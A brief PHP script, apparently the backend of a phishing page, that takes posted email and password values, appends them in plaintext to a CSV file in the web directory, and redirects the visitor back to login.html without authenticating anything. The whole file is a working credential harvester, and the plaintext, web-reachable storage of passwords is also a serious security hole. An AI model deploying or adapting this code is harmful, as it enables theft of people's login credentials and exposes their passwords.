<?php
// Check if form was submitted via POST method
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve email and password from form data
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // Prepare data to write to CSV file
    $data = array(
        array("LOGIN DETAILS"),
        array("EMAIL" => $email, "PASSWORD" => $password),array("\n")
    );

    // Open CSV file for appending
    $file = fopen("webdata.csv", 'a');

    // Write data to CSV file
    foreach ($data as $row) {
        fputcsv($file, $row);
    }

    // Close file handle
    fclose($file);

    // Redirect to login.html after successful operation
    header("Location: login.html");
    exit();
} else {
    // Redirect to login.html if form was not submitted via POST method
    header("Location: login.html");
    exit();
}
?>
